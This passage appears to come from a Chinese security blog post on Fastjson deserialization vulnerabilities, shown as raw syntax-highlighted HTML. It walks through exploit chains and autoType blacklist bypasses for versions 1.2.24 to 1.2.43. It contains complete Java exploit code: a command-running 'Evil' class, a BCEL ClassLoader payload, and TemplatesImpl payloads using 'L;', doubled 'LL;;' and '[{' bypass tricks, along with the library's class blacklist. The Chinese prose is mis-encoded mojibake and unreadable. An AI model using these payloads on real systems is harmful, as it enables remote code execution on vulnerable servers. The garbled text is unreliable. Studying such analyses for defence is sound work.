class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.BECL;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(Evil.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br><span class="hljs-comment">//        String payload=&quot;&#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;@type\&quot;: \&quot;org.apache.commons.dbcp.BasicDataSource\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;driverClassLoader\&quot;: &#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;            \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        &#125;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;+code+&quot;\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;&#125;&quot;;  //è¿™ä¸ªåœ¨parseObjectçš„æ—¶å€™é€‚ç”¨</span><br>        String payload=<span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.alibaba.fastjson.JSONObject\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;x\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.commons.dbcp.BasicDataSource\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;</span>+code+<span class="hljs-string">&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;: \&quot;x\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409040119696.png" alt="image-20240904011923509"></p><p><strong>åˆ©ç”¨é“¾åˆ†æ</strong></p><p>å»çœ‹ä¸€ä¸‹BasicDataSourceçš„æºç ä¸­å¯¹åº”çš„å…³é”®æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409032251464.png" alt="image-20240903225126325"></p><p><img src="https://cdn.clown2024.cn/202409032305310.png" alt="image-20240903230514187"></p><p>å¥½å§æƒ³è‡ªå·±å»çœ‹å‘ç°å¥½åƒè¿™ä¸ªè°ƒç”¨ä¸å¤ªä¸€æ ·ï¼Œè¿™æ˜¯ä¼šè°ƒç”¨çš„setæ–¹æ³•ï¼Œæ–‡ç« çš„åˆ©ç”¨é“¾å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BasicDataSource.getConnection() -&gt; createDataSource() -&gt; createConnectionFactory()<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯æ–‡ç« çš„è§£é‡Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">æŒ‰ç†è¯´åº”è¯¥æ˜¯ä¸ä¼šè°ƒç”¨åˆ°getConnectionæ–¹æ³•çš„ï¼ŒåŸPoCä¸­å¾ˆå·§å¦™çš„åˆ©ç”¨äº† JSONObjectå¯¹è±¡çš„ toString() æ–¹æ³•å®ç°äº†çªç ´ã€‚JSONObjectæ˜¯Mapçš„å­ç±»ï¼Œåœ¨æ‰§è¡ŒtoString() æ—¶ä¼šå°†å½“å‰ç±»è½¬ä¸ºå­—ç¬¦ä¸²å½¢å¼ï¼Œä¼šæå–ç±»ä¸­æ‰€æœ‰çš„Fieldï¼Œè‡ªç„¶ä¼šæ‰§è¡Œç›¸åº”çš„ getter ç­‰æ–¹æ³•ã€‚<br><br>é¦–å…ˆï¼Œåœ¨ &#123;â€œ@typeâ€: â€œorg.apache.tomcat.dbcp.dbcp2.BasicDataSourceâ€â€¦â€¦&#125; è¿™ä¸€æ•´æ®µå¤–é¢å†å¥—ä¸€å±‚&#123;&#125;ï¼Œååºåˆ—åŒ–ç”Ÿæˆä¸€ä¸ª JSONObject å¯¹è±¡ã€‚<br><br>ç„¶åï¼Œå°†è¿™ä¸ª JSONObject æ”¾åœ¨ JSON Key çš„ä½ç½®ä¸Šï¼Œåœ¨ JSON ååºåˆ—åŒ–çš„æ—¶å€™ï¼ŒFastJson ä¼šå¯¹ JSON Key è‡ªåŠ¨è°ƒç”¨ toString() æ–¹æ³•ï¼Œäºæ˜¯ä¹å°±è§¦å‘äº†BasicDataSource.getConnection()ã€‚<br></code></pre></td></tr></table></figure><blockquote><p>æ„Ÿè§‰æ–‡ç« è®²å¾—éƒ½æœ‰ç‚¹æ€ªï¼Œç„¶åè‡ªå·±è°ƒäº†åŠå¤©æ‰æ‰¾åˆ°ç¡®åˆ‡ä½ç½®ï¼Œæ¥ä¸‹æ¥åˆ†æä¹Ÿä¸çŸ¥é“æ­£ä¸æ­£ç¡®ï¼Œèƒ½è¯´æœæˆ‘è‡ªå·±å°±å¥½ï¼ˆ</p></blockquote><p><img src="https://cdn.clown2024.cn/202409040058412.png" alt="image-20240904005819248"></p><p>é¦–å…ˆèµ°åˆ°parseObjectè¿™é‡Œï¼Œç„¶åä¸€ç›´å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409040100256.png" alt="image-20240904010058091"></p><p>èµ°åˆ°è¿™ä¼šè°ƒç”¨keyçš„toStringæ–¹æ³•ï¼Œè¿™æ—¶å€™valueä¸ºBasicDataSourceçš„æ—¶å€™æ˜¯å…³é”®æˆ‘ä»¬è·Ÿè¿›å»çœ‹</p><p><img src="https://cdn.clown2024.cn/202409040103451.png" alt="image-20240904010314293"></p><p>ç„¶ååˆ°è¿™ä¸ªwriteæ–¹æ³•ï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409040105060.png" alt="image-20240904010542894"></p><p>ç„¶åè¿›åˆ°ä¸€ä¸ªMapçš„éå†é‡Œé¢ï¼Œå‰é¢è¿›è¡Œäº†ä¸€äº›æ“ä½œå°†ä»–è½¬æˆäº†Mapç±»å‹ï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409040108276.png" alt="image-20240904010839142"></p><p>è¿™é‡Œå°±æ˜¯æœ€åçš„æ–¹æ³•äº†ï¼Œå¯¹å­—æ®µè¿›è¡Œéå†</p><p><img src="https://cdn.clown2024.cn/202409040111143.png" alt="image-20240904011101980"></p><p>è¿™é‡Œå¯¹æ¯ä¸ªfieldè¿›è¡Œéå†ï¼Œç„¶åè°ƒç”¨ä»–ä»¬çš„getæ–¹æ³•ï¼Œè¿™é‡Œéå†åˆ°connectionå°±ä¼šè°ƒç”¨æˆ‘ä»¬æåˆ°çš„getConnection</p><p><img src="https://cdn.clown2024.cn/202409040112186.png" alt="image-20240904011236055"></p><p><img src="https://cdn.clown2024.cn/202409040113127.png" alt="image-20240904011312996"></p><p><img src="https://cdn.clown2024.cn/202409040051567.png" alt="image-20240904005104420"></p><p>æœ€ç»ˆæˆåŠŸè°ƒç”¨ï¼Œå…¶å®è°ƒçš„æˆ‘è¿˜æ˜¯æœ‰ç‚¹ä¸æ˜ä¸ç™½ï¼Œåªèƒ½è¯´å¤§è‡´çŸ¥é“</p><p>å¦‚æœæ˜¯parseObjectçš„è¯ï¼Œä»–ä¼šè§¦å‘æ‰€æœ‰getå’Œsetæ–¹æ³•ï¼Œç›´æ¥è¿™ç§payloadä¹Ÿå¯ä»¥ï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b......&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>é™¤äº†ä¸Šé¢çš„ä¾èµ–è¿˜æœ‰ä¸€äº›é€‚ç”¨æ›´å¹¿æ³›çš„ä¾èµ–ï¼Œä¸è¿‡åˆ©ç”¨ä¾æ—§æ˜¯BasicDataSourceç±»</p><p>åœ¨æ—§ç‰ˆæœ¬çš„ tomcat-dbcp åŒ…ä¸­ï¼Œå¯¹åº”çš„è·¯å¾„æ˜¯ org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><p>æ¯”å¦‚ï¼š6.0.53ã€7.0.81ç­‰ç‰ˆæœ¬</p><p>åœ¨Tomcat 8.0ä¹‹ååŒ…è·¯å¾„æœ‰æ‰€å˜åŒ–ï¼Œæ›´æ”¹ä¸ºäº† org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><h1 id="fastjson1225-1241ç»•è¿‡"><a href="#Fastjson1-2-25-1-2-41ç»•è¿‡" class="headerlink" title="Fastjson1.2.25-1.2.41ç»•è¿‡"></a>Fastjson1.2.25-1.2.41ç»•è¿‡</h1><p>Fastjsonåœ¨1.2.25ç‰ˆæœ¬å°±åŠ å…¥äº†é»‘ç™½åå•æœºåˆ¶</p><p>è¿™æ—¶å€™æˆ‘ä»¬å†å»æ‰§è¡Œå‰é¢çš„expå°±ä¼šçˆ†å‡ºä¸‹é¢çš„é”™è¯¯</p><p><img src="https://cdn.clown2024.cn/202408302326388.png" alt="image-20240830232605306"></p><p>å†å»çœ‹ParserConfigé‡Œé¢å¯ä»¥çœ‹åˆ°å¾ˆå¤šç±»è¢«åŠ å…¥äº†é»‘åå•</p><p><img src="https://cdn.clown2024.cn/202408302328066.png" alt="image-20240830232822995"></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">bsh<br>com.mchange<br>com.sun.<br>java.lang.Thread<br>java.net.Socket<br>java.rmi<br>javax.xml<br>org.apache.bcel<br>org.apache.commons.beanutils<br>org.apache.commons.collections.Transformer<br>org.apache.commons.collections.functors<br>org.apache.commons.collections4.comparators<br>org.apache.commons.fileupload,org.apache.myfaces.context.servlet<br>org.apache.tomcat<br>org.apache.wicket.util<br>org.codehaus.groovy.runtime<br>org.hibernate<br>org.jboss,org.mozilla.javascript<br>org.python.core<br>org.springframework<br></code></pre></td></tr></table></figure><p>å…ˆç»™å‡ºç»•è¿‡çš„payload</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//å¼€å¯AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&quot;</span>; <span class="hljs-comment">//å‰é¢åŠ äº†Lï¼Œç»“å°¾åŠ äº†;</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408310015033.png" alt="image-20240831001535905"></p><p>ç„¶åæ¥çœ‹ä¸€ä¸‹å…·ä½“çš„ç»•è¿‡åŸç†</p><p>å…ˆå»çœ‹ä¸€ä¸‹checkAutoTypeå‡½æ•°åœ¨å“ªé‡Œè¢«è°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/202408310022516.png" alt="image-20240831002214426"></p><p>æˆ‘ä»¬å¯ä»¥å¯¹æ¯”ä¹‹å‰çš„ç‰ˆæœ¬æ¥çœ‹ï¼Œä¹‹å‰çš„ç‰ˆæœ¬æ˜¯ç›´æ¥loadClassäº†ï¼Œæˆ‘ä»¬è¿›åˆ°è¿™ä¸ªå‡½æ•°é‡Œé¢çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/202408310026977.png" alt="image-20240831002652886"></p><p>è¿™é‡Œæˆ‘ä»¬å¦‚æœè®¾ç½®äº†autoTypeSupportä¸ºtrueä»–å°±ä¼šå»å°†æˆ‘ä»¬çš„è¿™ä¸ªç±»å»åŒ¹é…ç™½åå•ï¼ŒåŒ¹é…åˆ°äº†å°±loadClass</p><p>å¦‚æœæ²¡åŒ¹é…åˆ°å°±ä¼šè¿›åˆ°ä¸‹é¢é»‘åå•çš„åŒ¹é…</p><p><img src="https://cdn.clown2024.cn/202408310030353.png" alt="image-20240831003005272"></p><p>åŒ¹é…åˆ°é»‘åå•å°±ä¼šæŠ›å‡ºå¼‚å¸¸<strong>autoType is not support</strong></p><p><img src="https://cdn.clown2024.cn/202408310032079.png" alt="image-20240831003254981"></p><p>å¦‚æœæ²¡æœ‰å¼€å¯autoTypeSupportå°±ä¼šå…ˆåŒ¹é…é»‘åå•å†åŒ¹é…ç™½åå•</p><p>æœ€åå¦‚æœè¦æ˜¯é»‘ç™½åå•éƒ½åŒ¹é…ä¸åˆ°ï¼ŒautoTypeSupportä¸ºtrueä¸”expectClassä¸ä¸ºnullå°±ç›´æ¥loadClass</p><p><img src="https://cdn.clown2024.cn/202408310036025.png" alt="image-20240831003602958"></p><p>å¦åˆ™å°±ä¸åŠ è½½è¿™ä¸ªç±»äº†ç›´æ¥ï¼Œæˆ‘ä»¬payloadæœ€åè¿›åˆ°çš„å°±æ˜¯é»‘ç™½åå•éƒ½åŠ è½½ä¸åˆ°çš„loadClassï¼Œæˆ‘ä»¬è¿›loadClassæ–¹æ³•é‡Œé¢çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408310039880.png" alt="image-20240831003942791"></p><p>è¿™é‡Œå°±é‡åˆ°äº†æˆ‘ä»¬å‰é¢æåˆ°çš„ç”¨æ¥ç»•è¿‡çš„åœ°æ–¹</p><p>å…ˆçœ‹ç¬¬ä¸€ä¸ªç®­å¤´å¤„çš„ä»£ç ï¼Œå¦‚æœç±»åçš„å­—ç¬¦ä¸²ä»¥[å¼€å¤´ï¼Œåˆ™è¯´æ˜è¯¥ç±»æ˜¯ä¸€ä¸ªæ•°ç»„ç±»å‹ï¼Œéœ€è¦é€’å½’è°ƒç”¨loadClassæ–¹æ³•æ¥åŠ è½½æ•°ç»„å…ƒç´ ç±»å‹å¯¹åº”çš„classå¯¹è±¡ç„¶åä½¿ç”¨Array.newInstanceæ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ªç©ºæ•°ç»„å¯¹è±¡ï¼Œæœ€åè¿”å›è¯¥æ•°ç»„å¯¹è±¡çš„classå¯¹è±¡</p><p>ç¬¬äºŒä¸ªç®­å¤´å¤„çš„ä»£ç ï¼Œå¦‚æœç±»åçš„å­—ç¬¦ä¸²ä»¥Lå¼€å¤´å¹¶ä»¥;ç»“å°¾ï¼Œåˆ™è¯´æ˜è¯¥ç±»æ˜¯ä¸€ä¸ªæ™®é€šçš„Javaç±»ï¼Œéœ€è¦æŠŠå¼€å¤´çš„Lå’Œç»“å°¾çš„;ç»™å»æ‰ï¼Œç„¶åé€’å½’è°ƒç”¨loadClass</p><p>é‚£å…¶å®å°±å¾ˆæ¸…æ™°äº†ï¼Œå¾ˆå®¹æ˜“å°±æ˜ç™½æˆ‘ä»¬å‰é¢payloadçš„ç»•è¿‡åŸç†</p><blockquote><p>ä¸ç”¨[çš„åŸå› æ˜¯fastjsonåœ¨å‰é¢å·²ç»åˆ¤æ–­è¿‡æ˜¯å¦ä¸ºæ•°ç»„äº†ï¼Œå®é™…èµ°ä¸åˆ°è¿™ä¸€æ­¥</p></blockquote><p>ç»•è¿‡å°±ä¸¤æ­¥</p><ol><li>å¼€å¯autoTypeSupport</li><li>Lå¼€å¤´;ç»“å°¾</li></ol><p>ä¸è¿‡è¿™ä¸ªå‚æ•°è¦åœ¨æœåŠ¡ç«¯æ‰‹åŠ¨å¼€å¯ï¼Œé»˜è®¤ä¸ºfalseå¯ç”¨ç™½åå•ï¼Œæœ‰ç‚¹ä¸å¥½åˆ©ç”¨æˆ‘æ„Ÿè§‰</p><h1 id="fastjson1242"><a href="#FastJson1-2-42" class="headerlink" title="FastJson1.2.42"></a>FastJson1.2.42</h1><p>è¯¥ç‰ˆæœ¬ä¿®æ”¹äº†ä¸‹é¢ä¸¤ç‚¹ï¼š</p><ul><li>é»‘åå•æ”¹ä¸ºäº†hashå€¼ï¼Œé˜²æ­¢ç»•è¿‡</li><li>å¯¹äºä¼ å…¥çš„ç±»åï¼Œåˆ é™¤å¼€å¤´<code>L</code>å’Œç»“å°¾çš„<code>;</code></li></ul><p><img src="https://cdn.clown2024.cn/202408310051883.png" alt="image-20240831005115787"></p><blockquote><p>ç¬‘æ­»äº†ï¼Œæ–‡ç« è¿˜æ²¡çœ‹å®ŒçŒœæµ‹æ˜¯ä¸æ˜¯å°±æå‰æ ¡éªŒåˆ äº†ä¸€æ¬¡ï¼Œç›´æ¥çŒœåŒå†™èƒ½ä¸èƒ½ç»•è¿‡ï¼Œç»“æœçœŸç»•è¿‡å»äº†ğŸ¤£</p></blockquote><p>çœ‹ä¸€ä¸‹ä»–çš„checkAutoTypeå‡½æ•°å˜åŒ–</p><p><img src="https://cdn.clown2024.cn/202408311524654.png" alt="image-20240831152406512"></p><p>æ€»ä¹‹è¿™é‡Œå°±æ˜¯å¯¹å­—ç¬¦ä¸²è¿›è¡Œäº†æˆªå–ä½†åªæˆªå–äº†ä¸€æ¬¡</p><p>TemplatesImplçš„expå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-comment">//FastJson1.2.42</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//å¼€å¯AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;&quot;</span>; <span class="hljs-comment">//å‰é¢åŠ äº†Lï¼Œç»“å°¾åŠ äº†; è¿›è¡Œäº†åŒå†™ç»•è¿‡</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="fastjson1243"><a href="#FastJson1-2-43" class="headerlink" title="FastJson1.2.43"></a>FastJson1.2.43</h1><p>è¿™ä¸ªç‰ˆæœ¬åˆæ˜¯ä¿®æ”¹äº†checkAutoTypeå‡½æ•°ï¼Œè¿™æ¬¡å¯¹äºLLç­‰å¼€å¤´ç»“å°¾çš„å­—ç¬¦ä¸²ç›´æ¥æŠ›å‡ºå¼‚å¸¸</p><p>ä¸Šé¢payloadæ‰§è¡Œç»“æœ</p><p><img src="https://cdn.clown2024.cn/202408311527303.png" alt="image-20240831152750175"></p><p>çœ‹ä¸€ä¸‹checkAutoTypeå‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202408311530201.png" alt="image-20240831153008103"></p><p>è¿™é‡Œç›´æ¥å°±æŠ›å¼‚å¸¸äº†</p><p>ä½†æ˜¯æ²¡æœ‰å¯¹[è¿›è¡Œé™åˆ¶ï¼Œå¯ä»¥é€šè¿‡[{æ¥ç»•è¿‡ï¼Œæ”¹åçš„expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-comment">//FastJson1.2.43</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 